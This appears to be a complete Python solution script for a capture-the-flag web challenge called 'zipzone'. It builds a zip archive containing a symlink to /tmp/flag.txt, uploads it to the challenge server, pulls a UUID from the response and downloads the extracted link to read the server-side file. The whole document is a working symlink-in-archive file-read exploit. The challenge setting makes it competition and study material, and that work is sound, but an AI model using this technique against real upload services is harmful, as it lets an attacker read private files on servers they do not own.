#!/usr/bin/env python3
import os
import re
import requests

os.system('ln -s /tmp/flag.txt flag.txt')
os.system('zip -y flag.zip flag.txt')

filepath = os.path.realpath('./flag.zip')
files = {'file': (filepath, open(filepath, 'rb'))}
response = requests.post('https://zipzone-web.challs.csc.tf/', files=files)

uuid = re.search('at <a.+>(.+)</a>', response.text).group(1)

response = requests.get(f'https://zipzone-web.challs.csc.tf/files/{uuid}/flag.txt')

print(response.text)

os.system('rm flag.txt flag.zip')
